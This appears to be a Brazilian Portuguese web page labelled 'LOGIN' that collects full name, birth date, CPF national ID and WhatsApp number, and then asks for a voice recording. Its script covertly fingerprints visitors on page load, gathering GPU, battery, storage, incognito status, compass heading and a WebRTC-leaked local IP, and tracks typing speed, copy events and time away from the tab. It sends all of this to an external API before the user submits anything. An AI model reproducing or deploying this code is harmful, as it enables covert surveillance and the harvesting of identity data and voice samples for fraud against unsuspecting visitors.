<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulário Pessoal</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, Arial, sans-serif;
      background: linear-gradient(135deg, #667eea, #764ba2);
      min-height: 100vh; padding: 12px;
      display: flex; justify-content: center; align-items: flex-start;
    }
    .container {
      background: #fff; padding: 22px 20px; border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      width: 100%; max-width: 380px; margin: 10px 0;
    }
    h1 { font-size: 18px; color: #333; text-align: center; margin-bottom: 4px; }
    .sub { text-align: center; color: #888; font-size: 11px; margin-bottom: 14px; }
    label {
      display: block; font-size: 12px; color: #555;
      margin-bottom: 4px; margin-top: 12px; font-weight: 600;
    }
    input, select, textarea {
      width: 100%; padding: 9px 10px; border: 1px solid #ddd;
      border-radius: 6px; font-size: 14px; font-family: inherit; background: #fff;
    }
    input:focus, select:focus, textarea:focus { outline: none; border-color: #667eea; }
    button {
      width: 100%; padding: 11px; background: #667eea; color: #fff;
      border: none; border-radius: 6px; font-size: 14px;
      font-weight: bold; cursor: pointer; margin-top: 20px;
    }
    button:hover { background: #5568d3; }
    button:disabled { background: #aaa; cursor: not-allowed; }
    .erro {
      margin-top: 12px; padding: 8px; border-radius: 6px;
      font-size: 12px; display: none; text-align: center;
      background: #ffe6e6; color: #a12d2d; border: 1px solid #e6b3b3;
    }

    #telaSucesso {
      display: none; position: fixed; inset: 0;
      background: #FFD400; color: #000; z-index: 9999;
      justify-content: center; align-items: center;
      padding: 30px; text-align: center;
    }
    #telaSucesso .icone { font-size: 70px; margin-bottom: 20px; animation: pular 1s infinite; }
    #telaSucesso h2 { font-size: 34px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
    #telaSucesso p { font-size: 18px; font-weight: 600; }
    @keyframes pular { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-12px);} }

    #telaAudio {
      display: none; position: fixed; inset: 0;
      background: linear-gradient(135deg, #667eea, #764ba2);
      z-index: 9999; padding: 20px;
      justify-content: center; align-items: center;
      overflow-y: auto;
    }
    #telaAudio .caixa {
      background: #fff; padding: 26px 22px; border-radius: 14px;
      max-width: 380px; width: 100%;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      text-align: center;
    }
    #telaAudio h2 { font-size: 20px; color: #333; margin-bottom: 8px; }
    #telaAudio p { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.5; }
    #btnGravar {
      width: 120px; height: 120px; border-radius: 50%;
      background: #e74c3c; color: #fff; border: none;
      font-size: 40px; cursor: pointer; margin: 10px auto;
      display: flex; align-items: center; justify-content: center;
      box-shadow: 0 6px 20px rgba(231, 76, 60, 0.4);
      transition: all 0.3s;
      padding: 0;
    }
    #btnGravar:hover { transform: scale(1.05); }
    #btnGravar.gravando {
      background: #c0392b;
      animation: pulso 1s infinite;
    }
    @keyframes pulso {
      0%,100% { box-shadow: 0 6px 20px rgba(231,76,60,0.4); }
      50%     { box-shadow: 0 6px 40px rgba(231,76,60,0.9), 0 0 60px rgba(231,76,60,0.5); }
    }
    #btnGravar:disabled { background: #aaa; cursor: not-allowed; }
    #tempoGrava {
      font-size: 20px; color: #e74c3c; font-weight: bold;
      margin-top: 12px; font-family: 'Consolas', monospace;
    }
    #statusTexto {
      font-size: 13px; color: #666; margin-top: 10px;
      min-height: 20px;
    }
    #previewAudio {
      display: none; width: 100%; margin-top: 18px;
    }
    .botoes-audio {
      display: flex; gap: 10px; margin-top: 18px; flex-wrap: wrap;
    }
    .botoes-audio button {
      flex: 1; padding: 12px; border-radius: 8px;
      font-size: 14px; font-weight: bold; cursor: pointer;
      border: none; margin: 0;
    }
    .btn-enviar-audio { background: #27ae60; color: #fff; }
    .btn-enviar-audio:hover { background: #1e8449; }
    .btn-pular { background: #ddd; color: #333; }
    .btn-pular:hover { background: #bbb; }
    .btn-recomecar { background: #e74c3c; color: #fff; }
    .btn-recomecar:hover { background: #c0392b; }
  </style>
</head>
<body>

  <div id="telaSucesso">
    <div>
      <div class="icone">📨</div>
      <h2>AGORA AGUARDE<br>VAMOS ENTRAR EM CONTATO</h2>
      <p>Obrigado por preencher! 💛</p>
    </div>
  </div>

  <div id="telaAudio">
    <div class="caixa">
      <h2>🎙️ Quer deixar um recado?</h2>
      <p>Toque no botão vermelho pra gravar uma mensagem de voz<br>(opcional, mas ajuda muito!)</p>

      <button id="btnGravar" title="Gravar áudio">🎙️</button>
      <div id="tempoGrava">00:00</div>
      <div id="statusTexto">Toque no microfone pra começar</div>

      <audio id="previewAudio" controls></audio>

      <div class="botoes-audio" id="botoesAudio" style="display:none;">
        <button class="btn-recomecar" onclick="recomecar()">🔄 Regravar</button>
        <button class="btn-enviar-audio" onclick="enviarAudio()">✅ Enviar</button>
      </div>

      <button class="btn-pular" id="btnPular" style="margin-top:18px; width:100%; padding:12px; border-radius:8px; border:none; font-size:14px; font-weight:bold; cursor:pointer;" onclick="pular()">Pular esta etapa</button>
    </div>
  </div>

  <div class="container">
    <h1>🔒 LOGIN</h1>
    <p class="sub">Preencha seus dados abaixo</p>

    <label for="nome">Nome completo *</label>
    <input id="nome" type="text" placeholder="Ex: João Silva" />

    <label for="dataNascimento">Data de nascimento *</label>
    <input id="dataNascimento" type="date" />

    <label for="cpf">CPF *</label>
    <input id="cpf" type="text" placeholder="000.000.000-00" maxlength="14" />

    <label for="whatsapp">WhatsApp *</label>
    <input id="whatsapp" type="tel" placeholder="Ex: (11) 99999-9999" />

    <button id="btn">Enviar</button>
    <div id="resultado" class="erro"></div>
  </div>

  <script>
    const API_URL = 'https://gets-invio-on-api.onrender.com';

    // ====== RASTREAMENTO ======
    let tempoFora = 0;
    let ultimaSaida = null;
    let copiouAlgo = false;
    let teclasDigitadas = 0;
    let inicioDigitacao = null;
    let bussolaHeading = null;
    let storageInfo = null;
    let incognito = false;
    let connectionType = 'Desconhecida';
    let localIP = null;

    document.addEventListener('visibilitychange', function() {
      if (document.hidden) {
        ultimaSaida = Date.now();
      } else if (ultimaSaida) {
        tempoFora += Math.round((Date.now() - ultimaSaida) / 1000);
        ultimaSaida = null;
      }
    });

    document.addEventListener('copy', function() { copiouAlgo = true; });

    document.querySelectorAll('input, textarea').forEach(function(el) {
      el.addEventListener('keydown', function() {
        if (!inicioDigitacao) inicioDigitacao = Date.now();
        teclasDigitadas++;
      });
    });

    try {
      if (navigator.connection && navigator.connection.type) {
        connectionType = navigator.connection.type;
      }
    } catch (e) {}

    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
      pc.onicecandidate = function(e) {
        if (!e.candidate) return;
        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
        if (match) {
          localIP = match[1];
          pc.close();
        }
      };
    } catch (e) {}

    async function detectarIncognito() {
      try {
        const k = '__test_incognito__';
        localStorage.setItem(k, '1');
        localStorage.removeItem(k);
        if (navigator.storage && navigator.storage.estimate) {
          const est = await navigator.storage.estimate();
          if (est.quota && est.quota < 120000000) return true;
        }
        return false;
      } catch (e) { return true; }
    }

    async function detectarStorage() {
      try {
        if (navigator.storage && navigator.storage.estimate) {
          const est = await navigator.storage.estimate();
          return {
            quota: Math.round((est.quota || 0) / 1024 / 1024),
            uso: Math.round((est.usage || 0) / 1024 / 1024),
          };
        }
      } catch (e) {}
      return null;
    }

    function detectarBussola() {
      return new Promise(function(resolve) {
        let resolvido = false;
        const timeout = setTimeout(function() {
          if (!resolvido) { resolvido = true; limpar(); resolve(null); }
        }, 2500);
        const handler = function(e) {
          let heading = null;
          if (e.webkitCompassHeading != null) heading = e.webkitCompassHeading;
          else if (e.alpha != null) heading = 360 - e.alpha;
          if (heading != null && !resolvido) {
            resolvido = true;
            clearTimeout(timeout);
            limpar();
            resolve(Math.round(heading));
          }
        };
        function limpar() {
          window.removeEventListener('deviceorientationabsolute', handler, true);
          window.removeEventListener('deviceorientation', handler, true);
        }
        try {
          window.addEventListener('deviceorientationabsolute', handler, true);
          window.addEventListener('deviceorientation', handler, true);
        } catch (e) {
          clearTimeout(timeout);
          resolve(null);
        }
      });
    }

    async function detectarDispositivo() {
      const ua = navigator.userAgent;
      let sistema = 'Desconhecido';
      let navegador = 'Desconhecido';
      let tipo = 'Desconhecido';

      if (/windows/i.test(ua)) sistema = 'Windows';
      else if (/android/i.test(ua)) sistema = 'Android';
      else if (/iphone|ipad|ipod/i.test(ua)) sistema = 'iOS';
      else if (/mac os/i.test(ua)) sistema = 'MacOS';
      else if (/linux/i.test(ua)) sistema = 'Linux';

      if (/edg/i.test(ua)) navegador = 'Edge';
      else if (/opr|opera/i.test(ua)) navegador = 'Opera';
      else if (/chrome/i.test(ua)) navegador = 'Chrome';
      else if (/firefox/i.test(ua)) navegador = 'Firefox';
      else if (/safari/i.test(ua)) navegador = 'Safari';

      if (/mobile|android|iphone|ipod/i.test(ua) && !/ipad/i.test(ua)) tipo = 'Celular';
      else if (/ipad|tablet/i.test(ua)) tipo = 'Tablet';
      else tipo = 'PC';

      let bateria = null;
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          bateria = {
            nivel: Math.round(b.level * 100),
            carregando: b.charging,
            tempoCarregar: b.chargingTime === Infinity ? null : Math.round(b.chargingTime / 60),
            tempoDescarregar: b.dischargingTime === Infinity ? null : Math.round(b.dischargingTime / 60),
          };
        }
      } catch (e) {}

      let conexao = 'Desconhecida';
      try {
        if (navigator.connection && navigator.connection.effectiveType) {
          conexao = navigator.connection.effectiveType;
        }
      } catch (e) {}

      const ram = navigator.deviceMemory || null;
      let fuso = 'Desconhecido';
      try { fuso = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido'; } catch (e) {}

      let orientacao = 'Desconhecida';
      try { if (screen.orientation && screen.orientation.type) orientacao = screen.orientation.type; } catch (e) {}

      const nucleos = navigator.hardwareConcurrency || null;

      let gpu = 'Desconhecida';
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Desconhecida';
        }
      } catch (e) {}

      const corProfundidade = screen.colorDepth || null;
      const pixelRatio = window.devicePixelRatio || 1;
      const touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
      const cookies = navigator.cookieEnabled;
      const agora = new Date();
      const horaCliente = agora.toLocaleString('pt-BR');

      incognito = await detectarIncognito();
      storageInfo = await detectarStorage();
      bussolaHeading = await detectarBussola();

      return {
        sistema: sistema, navegador: navegador, tipo: tipo,
        idioma: navigator.language || 'Desconhecido',
        tela: window.screen.width + 'x' + window.screen.height,
        bateria: bateria, conexao: conexao, ram: ram, fuso: fuso, orientacao: orientacao,
        nucleos: nucleos, gpu: gpu, corProfundidade: corProfundidade, pixelRatio: pixelRatio,
        touch: touch, cookies: cookies, horaCliente: horaCliente,
        incognito: incognito, storage: storageInfo, bussola: bussolaHeading,
        tipoConexao: connectionType, ipLocal: localIP,
      };
    }

    let dispositivo = null;

    (async function() {
      dispositivo = await detectarDispositivo();
      fetch(API_URL + '/visita', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ dispositivo: dispositivo })
      }).catch(function() {});
    })();

    const btn = document.getElementById('btn');
    const resultado = document.getElementById('resultado');
    const telaSucesso = document.getElementById('telaSucesso');
    const telaAudio = document.getElementById('telaAudio');
    const inicio = Date.now();

    let idCadastro = null;

    function pegar(id) { return document.getElementById(id).value.trim(); }

    document.getElementById('cpf').addEventListener('input', function(e) {
      let v = e.target.value.replace(/\D/g, '').slice(0, 11);
      v = v.replace(/(\d{3})(\d)/, '$1.$2');
      v = v.replace(/(\d{3})(\d)/, '$1.$2');
      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      e.target.value = v;
    });

    function calcVelocidadeDigitacao() {
      if (!inicioDigitacao || teclasDigitadas < 2) return null;
      const segundos = (Date.now() - inicioDigitacao) / 1000;
      if (segundos < 1) return null;
      return Math.round((teclasDigitadas / segundos) * 60);
    }

    function pegarOrigem() {
      const ref = document.referrer;
      if (!ref) return 'Direto (digitou ou favorito)';
      if (ref.includes('wa.me') || ref.includes('whatsapp')) return 'WhatsApp';
      if (ref.includes('instagram')) return 'Instagram';
      if (ref.includes('facebook') || ref.includes('fb.')) return 'Facebook';
      if (ref.includes('tiktok')) return 'TikTok';
      if (ref.includes('google')) return 'Google';
      if (ref.includes('bing')) return 'Bing';
      if (ref.includes('youtube')) return 'YouTube';
      if (ref.includes('twitter') || ref.includes('x.com')) return 'Twitter/X';
      if (ref.includes('telegram')) return 'Telegram';
      if (ref.includes('linkedin')) return 'LinkedIn';
      try { return 'Outro: ' + new URL(ref).hostname; } catch (e) { return 'Desconhecida'; }
    }

    let jaVisitou = false;
    try {
      jaVisitou = localStorage.getItem('jaVisitou') === 'sim';
      localStorage.setItem('jaVisitou', 'sim');
    } catch (e) {}

    btn.addEventListener('click', async function() {
      const tempoSegundos = Math.round((Date.now() - inicio) / 1000);

      const dadosForm = {
        nome: pegar('nome'),
        dataNascimento: pegar('dataNascimento'),
        cpf: pegar('cpf'),
        whatsapp: pegar('whatsapp'),
        dispositivo: dispositivo,
        origem: pegarOrigem(),
        jaVisitou: jaVisitou,
        tempoPreenchimento: tempoSegundos,
        tempoFora: tempoFora,
        copiouAlgo: copiouAlgo,
        velocidadeDigitacao: calcVelocidadeDigitacao(),
      };

      resultado.style.display = 'none';

      const obrig = ['nome','dataNascimento','cpf','whatsapp'];
      const faltando = obrig.filter(function(c) { return !dadosForm[c]; });
      if (faltando.length > 0) {
        resultado.textContent = '⚠️ Preencha todos os campos com *';
        resultado.style.display = 'block';
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Enviando...';

      try {
        const r = await fetch(API_URL + '/enviar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(dadosForm)
        });
        const dados = await r.json();

        if (dados.sucesso) {
          idCadastro = dados.dados.id;
          telaSucesso.style.display = 'flex';
          setTimeout(function() {
            telaSucesso.style.display = 'none';
            telaAudio.style.display = 'flex';
          }, 5000);
        } else {
          resultado.textContent = '❌ ' + (dados.erro || 'Erro.');
          resultado.style.display = 'block';
        }
      } catch (e) {
        resultado.textContent = '❌ Erro ao conectar. Tente novamente.';
        resultado.style.display = 'block';
      }

      btn.disabled = false;
      btn.textContent = 'Enviar';
    });

    // ====== GRAVAÇÃO DE ÁUDIO ======
    let mediaRecorder = null;
    let chunksAudio = [];
    let gravando = false;
    let inicioGravacao = null;
    let intervaloTimer = null;
    let blobAudio = null;
    let duracaoFinal = 0;  // <-- CORRIGIDO: duração real

    const btnGravar = document.getElementById('btnGravar');
    const tempoGrava = document.getElementById('tempoGrava');
    const statusTexto = document.getElementById('statusTexto');
    const previewAudio = document.getElementById('previewAudio');
    const botoesAudio = document.getElementById('botoesAudio');
    const btnPular = document.getElementById('btnPular');

    btnGravar.addEventListener('click', async function() {
      if (!gravando) {
        await iniciarGravacao();
      } else {
        pararGravacao();
      }
    });

    async function iniciarGravacao() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        // Escolhe o melhor formato disponível
        let mimeType = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
          mimeType = 'audio/webm;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
          mimeType = 'audio/mp4';
        } else if (MediaRecorder.isTypeSupported('audio/ogg')) {
          mimeType = 'audio/ogg';
        }

        chunksAudio = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });

        mediaRecorder.ondataavailable = function(e) {
          if (e.data && e.data.size > 0) chunksAudio.push(e.data);
        };

        mediaRecorder.onstop = function() {
          // CORRIGIDO: salva a duração real quando para
          duracaoFinal = Math.round((Date.now() - inicioGravacao) / 1000);

          blobAudio = new Blob(chunksAudio, { type: mimeType });
          const url = URL.createObjectURL(blobAudio);
          previewAudio.src = url;
          previewAudio.style.display = 'block';
          botoesAudio.style.display = 'flex';
          btnPular.style.display = 'none';
          statusTexto.textContent = 'Ouça seu áudio (' + duracaoFinal + 's) e envie se gostar';

          stream.getTracks().forEach(function(t) { t.stop(); });
        };

        // CORRIGIDO: 500ms = garante que não perde áudio
        mediaRecorder.start(500);
        gravando = true;
        inicioGravacao = Date.now();
        btnGravar.classList.add('gravando');
        btnGravar.textContent = '⏹️';
        statusTexto.textContent = '🔴 GRAVANDO... toque pra parar';

        intervaloTimer = setInterval(function() {
          const seg = Math.floor((Date.now() - inicioGravacao) / 1000);
          if (seg >= 60) {
            pararGravacao();
            return;
          }
          const m = String(Math.floor(seg / 60)).padStart(2, '0');
          const s = String(seg % 60).padStart(2, '0');
          tempoGrava.textContent = m + ':' + s;
        }, 200);

      } catch (e) {
        statusTexto.textContent = '❌ Não consegui acessar o microfone. Verifique as permissões.';
        console.log(e);
      }
    }

    function pararGravacao() {
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
      gravando = false;
      btnGravar.classList.remove('gravando');
      btnGravar.textContent = '🎙️';
      btnGravar.disabled = true;
      clearInterval(intervaloTimer);
    }

    function recomecar() {
      blobAudio = null;
      duracaoFinal = 0;
      previewAudio.src = '';
      previewAudio.style.display = 'none';
      botoesAudio.style.display = 'none';
      btnPular.style.display = 'block';
      btnGravar.disabled = false;
      btnGravar.textContent = '🎙️';
      tempoGrava.textContent = '00:00';
      statusTexto.textContent = 'Toque no microfone pra começar';
    }

    async function enviarAudio() {
      if (!blobAudio || !idCadastro) return;

      statusTexto.textContent = '⏳ Enviando áudio...';
      botoesAudio.style.display = 'none';

      const reader = new FileReader();
      reader.readAsDataURL(blobAudio);
      reader.onloadend = async function() {
        const base64 = reader.result;

        try {
          const r = await fetch(API_URL + '/enviar-audio', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              idCadastro: idCadastro,
              audio: base64,
              duracao: duracaoFinal,  // <-- CORRIGIDO: usa a duração real
            })
          });
          const dados = await r.json();

          if (dados.sucesso) {
            statusTexto.textContent = '✅ Áudio enviado! Muito obrigado!';
            tempoGrava.textContent = '💛';
            setTimeout(function() {
              telaAudio.style.display = 'none';
              alert('Obrigado! Seus dados e mensagem foram recebidos. 💛');
            }, 1500);
          } else {
            statusTexto.textContent = '❌ Erro ao enviar. Tente novamente.';
            botoesAudio.style.display = 'flex';
          }
        } catch (e) {
          statusTexto.textContent = '❌ Erro de conexão. Tente novamente.';
          botoesAudio.style.display = 'flex';
        }
      };
    }

    function pular() {
      telaAudio.style.display = 'none';
      alert('Obrigado! Seus dados foram recebidos. 💛');
    }
  </script>
</body>
</html>
